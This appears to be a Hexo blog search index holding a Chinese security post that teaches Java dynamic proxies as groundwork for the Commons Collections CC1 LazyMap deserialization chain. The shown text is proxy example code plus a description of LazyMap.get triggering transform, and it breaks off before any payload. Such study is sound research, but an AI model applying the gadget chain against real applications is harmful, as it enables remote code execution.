<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CC重启之基于动态代理构造的LazyMap CC1及利用二次反序列化的修复</title>
      <link href="/2024/07/13/cc-chong-qi-zhi-ji-yu-dong-tai-dai-li-gou-zao-de-lazymap-ban-cc1/"/>
      <url>/2024/07/13/cc-chong-qi-zhi-ji-yu-dong-tai-dai-li-gou-zao-de-lazymap-ban-cc1/</url>
      
        <content type="html"><![CDATA[<p>前置知识：</p><h2 id="Java动态代理"><a href="#Java动态代理" class="headerlink" title="Java动态代理"></a>Java动态代理</h2><h3 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h3><p>假设现在有这么一个需求：</p><ul><li>创建了一个接口A，里面有display()函数、select()函数、add()函数，类AImpl实现了这三个函数，类AstaticProxy作为类AImpl的日志类，在AImpl每个函数执行完打印“调用了display函数”，调用了”select函数”…类似对AImpl进行装饰</li></ul><p>即如下实现代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//接口Ainterface</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Ainterface</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">display</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">select</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//类AImple</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AImpl</span> <span class="keyword">implements</span> <span class="title class_">Ainterface</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">display</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;display&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">select</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;select&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;add&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//AImpl的日志类AstaticProxy，在AImpl实例上添加功能</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AstaticProxy</span> <span class="keyword">implements</span> <span class="title class_">Ainterface</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Ainterface aimpl;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">AstaticProxy</span><span class="params">(Ainterface a)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.aimpl = a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">display</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        aimpl.display();</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了display&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">select</span><span class="params">()</span>&#123;</span><br><span class="line">        aimpl.select();</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了select&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        aimpl.add();</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了add&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上就完成了一个静态代理</p><p>在主函数中进行测试：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AProxyTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Ainterface</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AImpl</span>();</span><br><span class="line">        a.add();</span><br><span class="line">        a.display();</span><br><span class="line">        a.select();</span><br><span class="line">        <span class="type">Ainterface</span> <span class="variable">aproxy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AstaticProxy</span>(a);</span><br><span class="line">        aproxy.add();</span><br><span class="line">        aproxy.display();</span><br><span class="line">        aproxy.select();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240711220409517.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240711220409517.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240711220409517"></p><p>这样代理类AstaticProxy中进行的行为是AImpl多余的，不会影响原本的AImpl类，这就叫静态代理。</p><p>你也观察到了，三个方法打印，就要写三遍，而且是高度重复的代码，又或者是要在每个函数前面加同一个自定义函数。如果类似Map接口，方法多到离谱，也要冗余的写十几遍吗？此时就有了动态代理。</p><h3 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h3><p>java.lang.reflect包下的Proxy类和InvocationHandler接口组合使用就能创建一个动态代理实例</p><p>现在让我们舍弃AstaticProxy类，尝试写AdynamicProxy的动态代理类</p><p>这个代理类需要实现InvocationHandler接口，该接口内只有一个方法需要实现，就是invoke</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240711222419213.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240711222419213.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240711222419213"></p><p>在invoke内重写我们需要在每个方法内添加的内容。</p><p>在这里我们先不用关心怎么调用这个invoke（也就是如何传参），只需要知道在invoke内怎么使用这三个参数，proxy指代理对象本身，即new AdynamicProxy生成的对象，method是调用的方法，如add()；args是调用方法传的参数，如add()无参方法就是null。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//动态代理类AdynamicProxy，代理实现了Ainterface的类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AdynamicProxy</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Ainterface a;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">AdynamicProxy</span><span class="params">(Ainterface a)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.a = a;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> method.invoke(a, args);</span><br><span class="line">        <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> method.getName();</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了&quot;</span>+methodName);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用这个动态代理类，用<code>Proxy.newProxyInstance</code>生成代理类对象，看这个函数需要的参数：</p><p>第一个参数需要一个ClassLoader，通用写法<code>.class.getClassLoader()</code>，第二个参数传接口数组，可以写<code>new Class[]&#123;Ainterface.class&#125;</code>，也可以用通用写法<code>a.getClass().getInterfaces()</code>，第三个参数传实现了InvocationHandler的代理类，这样就生成了代理类实例。</p><p><strong>调用代理类实例的方法，会执行代理类的invoke方法。</strong>通过反射<code>Object result = method.invoke(a, args);</code>调用了AImpl的对应方法</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713110500610.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713110500610.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240713110500610"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AProxyTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Ainterface</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AImpl</span>();</span><br><span class="line">        <span class="type">Ainterface</span> <span class="variable">aproxy</span> <span class="operator">=</span> (Ainterface) Proxy.newProxyInstance(Ainterface.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Ainterface.class&#125;, <span class="keyword">new</span> <span class="title class_">AdynamicProxy</span>(a));</span><br><span class="line">        aproxy.add();</span><br><span class="line">        aproxy.display();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713110426076.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713110426076.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240713110426076"></p><p>且我们看到Proxyk可以序列化。</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240714162202753.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240714162202753.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240714162202753"></p><h4 id="newProxyInstance背后的逻辑"><a href="#newProxyInstance背后的逻辑" class="headerlink" title="newProxyInstance背后的逻辑"></a>newProxyInstance背后的逻辑</h4><p>我们分析一下newProxyInstance怎么创建的动态代理实例，我们的动态代理类AdynamicProxy里面只有一个构造函数和invoke方法，当然不能直接new生成。这个动态代理实例实际的装配过程就在newProxyInstance。</p><p>该函数内大多数代码都是安全检查和获取访问权限，重点在以下三句。最重要的就是getProxyClass0方法。</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713112129827.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713112129827.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240713112129827"></p><p>getProxyClass0方法内，调用了get方法查找缓存内有无已生成的代理类</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713112555131.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713112555131.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240713112555131"></p><p>这里proxyClassCache是一个WeakCache，WeakCache的get方法如果没有查找到对应键值，会创建一个新的条目，具体创建细节此处省略。</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713114024588.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713114024588.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240713114024588"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713113953632.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713113953632.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240713113953632"></p><p>ProxyClassCache的键是对接口的哈希，如调用的Key1方法，值是ProxyClassFactory工厂类生成的类</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713114408167.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713114408167.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240713114408167"></p><p>在ProxyClassFactory内就生成了代理实例的类名</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713114549185.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713114549185.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240713114549185"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713152350740.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713152350740.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240713152350740"></p><p>ProxyGenerator.generateProxyClass生成代理实例的字节码，defineClass0加载字节码</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713114644105.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713114644105.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240713114644105"></p><p>该类下调用的generateClassFile()</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713114843464.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713114843464.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240713114843464"></p><p>该方法遍历向每个方法中添加了generateMethod()方法，而generateMethod则是生成后的invoke内的代码，到这里就结束分析啦</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713115049701.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713115049701.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240713115049701"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713115155767.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713115155767.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240713115155767"></p><p>所以代理类的实现是重新生成了一个代理对象的class文件，该文件内依此向每个方法添加invoke的内容，最后defineClass加载字节码。让我们来找找这个class文件，验证一下分析。</p><h3 id="代理对象文件分析"><a href="#代理对象文件分析" class="headerlink" title="代理对象文件分析"></a>代理对象文件分析</h3><p>上文介绍了ProxyGenerator.generateProxyClass()方法生成了代理类的字节码文件，我们将这个虚拟机中的文件输出出来。</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713140425820.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713140425820.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240713140425820"></p><p>我们调用简化版的generateProxyClass，随便取个名字，传入a.getClass().getInterface()，输出文件</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713144645805.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713144645805.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240713144645805"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AProxyTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Ainterface</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] classFile = ProxyGenerator.generateProxyClass(<span class="string">&quot;org.example.AProxyExtract&quot;</span>, a.getClass().getInterfaces());</span><br><span class="line">        <span class="keyword">try</span>(<span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;E:\\CODE_COLLECT\\Idea_java_ProTest\\Test\\AProxyExtract.class&quot;</span>)) &#123;</span><br><span class="line">            fos.write(classFile);</span><br><span class="line">            fos.flush();</span><br><span class="line">            System.out.println(<span class="string">&quot;代理类class文件写入成功&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;写文件错误&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在输出的文件中，静态代码块获取了原本接口的方法，赋给<code>m数字</code></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713151330052.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713151330052.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240713151330052"></p><p>且该类（AProxyExtract）继承了Proxy类，则newProxyInstance生成的子类也可以序列化。</p><p>我们直接查看该类里的display方法</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713151732423.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713151732423.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240713151732423"></p><p>super.h就是我们向其父类传的InvocationHandler，也就是<code>new AdynamicProxy(a)</code>，可以看到直接调用了这个代理类的invoke方法</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713151852698.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713151852698.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240713151852698"></p><p>就全部能解释通了</p><h3 id="动态代理类中存在多接口的问题"><a href="#动态代理类中存在多接口的问题" class="headerlink" title="动态代理类中存在多接口的问题"></a>动态代理类中存在多接口的问题</h3><p>假设动态代理类为如下代码，请问被代理类可以是哪种，Proxy.newProxyInstance又该怎么传参？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AdynamicProxy</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Ainterface a;</span><br><span class="line">    <span class="keyword">private</span> Binterface b;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">AdynamicProxy</span><span class="params">(Ainterface a,Binterface b)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.a = a;</span><br><span class="line">        <span class="built_in">this</span>.b = b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> method.invoke(a, args);</span><br><span class="line">        <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> method.getName();</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了&quot;</span>+methodName);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>很明显，newProxyInstance可以传多个接口，生成的AdynamicProxy也需要分别传两个实现了A&#x2F;Binterface接口的类。那AdynamicProxy就同时代理了两个类，但是invoke是执行a中的方法，显然这样写是不行的。</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713210623620.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713210623620.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240713210623620"></p><p>把invoke改成如下，getDeclaringClass()判断该方法来自哪个接口，就能同时代理两个类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">    Object result;</span><br><span class="line">    <span class="keyword">if</span> (Ainterface.class.isAssignableFrom(method.getDeclaringClass())) &#123;</span><br><span class="line">        result = method.invoke(a, args);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Binterface.class.isAssignableFrom(method.getDeclaringClass())) &#123;</span><br><span class="line">        result = method.invoke(b, args);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Unsupported interface&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> method.getName();</span><br><span class="line">    System.out.println(<span class="string">&quot;调用了&quot;</span> + methodName);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相应的，传参如下，根据需要用Ainterface或Binterface存储</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Binterface</span> <span class="variable">aproxy</span> <span class="operator">=</span> (Binterface) Proxy.newProxyInstance(Ainterface.class.getClassLoader(), </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Ainterface.class, Binterface.class&#125;, </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">AdynamicProxy</span>(a,b));</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="LazyMap链"><a href="#LazyMap链" class="headerlink" title="LazyMap链"></a>LazyMap链</h2><p>总结上文动态代理的内容如下：</p><blockquote><p>动态代理是对一个类下所有方法的代理，用Proxy.newProxyInstance()创建，需要传入一个实现了InvocationHandler，重写了invoke方法的实例。在调用该代理类方法时，会自动跳转执行invoke内的内容。</p><p>共需要一个接口，一个实现了该接口的被代理类，一个实现了InvocationHnadler的代理类，最后Proxy.newInstance()创建代理实例。</p></blockquote><p>最简单的TransformedMap链（<a href="https://godownio.github.io/2024/07/10/cc-chong-qi-zhi-cong-ling-dai-ma-gou-zao-cc1/%EF%BC%89%E4%B8%AD%EF%BC%8C%E7%94%A8TransformeredMap.checkSetValue%E8%A7%A6%E5%8F%91ChainedTransformer.transform%E3%80%82%E5%90%8C%E6%97%B6%E6%88%91%E4%BB%AC%E4%B9%9F%E8%83%BD%E7%9C%8B%E5%88%B0LazyMap.get%E4%B9%9F%E8%B0%83%E7%94%A8%E4%BA%86transform%E6%96%B9%E6%B3%95%E3%80%82">https://godownio.github.io/2024/07/10/cc-chong-qi-zhi-cong-ling-dai-ma-gou-zao-cc1/）中，用TransformeredMap.checkSetValue触发ChainedTransformer.transform。同时我们也能看到LazyMap.get也调用了transform方法。</a></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713154230857.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713154230857.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240713154230857"></p><p>我们尝试通读一下LazyMap类，和TransformedMap一样，构造方法是protected类型，通过decorate调用构造函数对map进行装配，只不过这里除了map外只接收了一个Transformer参数。</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713190824083.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713190824083.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240713190824083"></p><p>构造函数存储传入的Transformer</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713191550433.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713191550433.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240713191550433"></p><p>在get函数内，如果map内有以参数key为键的值，则返回该值。如果没有，使用调用factory.transform()</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713191128650.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713191128650.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240713191128650"></p><p>从以上内容可以看出来，LazyMap.decorate是把传入的Transformer绑定到LazyMap。get函数就是从map中查找以Transfomer为键的值，没有就调用当前Transformer的transform方法，把返回对象做为value添加进map。</p><p>也就是：LazyMap意为懒装配Map，不像其他Map，LazyMap的创建只需要传入键，在get时才把键和transform返回的结果put进map。</p><p>书接上文<a 